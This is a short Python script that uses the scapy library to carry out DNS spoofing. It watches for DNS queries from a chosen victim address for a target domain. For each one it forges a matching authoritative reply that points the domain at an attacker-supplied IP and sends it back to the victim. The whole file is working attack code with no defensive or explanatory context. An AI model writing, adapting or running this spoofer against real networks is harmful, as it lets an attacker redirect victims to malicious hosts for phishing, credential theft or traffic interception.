import scapy.all as sc

def dns_spoof(packet, target_ip, spoofed_ip, target_domain):
    if packet.haslayer(sc.DNS) and packet[sc.IP].src == target_ip and packet[sc.DNS].qr == 0:
        qname = packet[sc.DNS].qd.qname
        try:
            qname_str = qname.decode()
        except:
            qname_str = str(qname)
        if qname == target_domain:
            print("[*] Spoofing DNS request for %s from %s" % (qname_str, packet[sc.IP].src))
            ip_layer = sc.IP(dst=packet[sc.IP].src, src=packet[sc.IP].dst)
            udp_layer = sc.UDP(dport=packet[sc.UDP].sport, sport=53)
            dns_layer = sc.DNS(
                id=packet[sc.DNS].id,
                qr=1, aa=1, qd=packet[sc.DNS].qd,
                an=sc.DNSRR(rrname=qname, ttl=10, rdata=spoofed_ip)
            )
            spoofed_packet = ip_layer/udp_layer/dns_layer
            sc.send(spoofed_packet, verbose=False)
        else:
            print("[!] Ignoring DNS for %s" % qname_str)